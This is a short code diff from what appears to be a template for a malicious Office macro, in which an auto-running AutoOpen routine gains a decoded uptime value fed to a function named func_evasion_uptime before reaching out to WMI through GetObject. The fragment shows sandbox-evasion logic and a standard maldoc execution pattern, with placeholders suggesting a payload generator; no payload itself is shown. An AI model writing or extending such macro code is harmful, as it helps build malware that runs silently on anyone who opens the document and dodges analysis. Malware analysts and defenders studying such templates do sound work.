@@ -7,10 +7,12 @@ Sub AutoOpen()
 	Dim var2 As Object
 	Dim var3 As Integer
 	Dim var4 As String
-	Dim var5 as String
+	Dim var5 As String
+	Dim var6 As Long
 	
 	var3 = [int1]
-	var1 = func_evasion_uptime([UPTIME])
+	var6 = CLng(decode("[UPTIME]"))
+	var1 = func_evasion_uptime(var6)
 	If (var1 = "bool1") Then 
 		var5 = init_wmi("data1")
 		Set var2 = GetObject(var5)
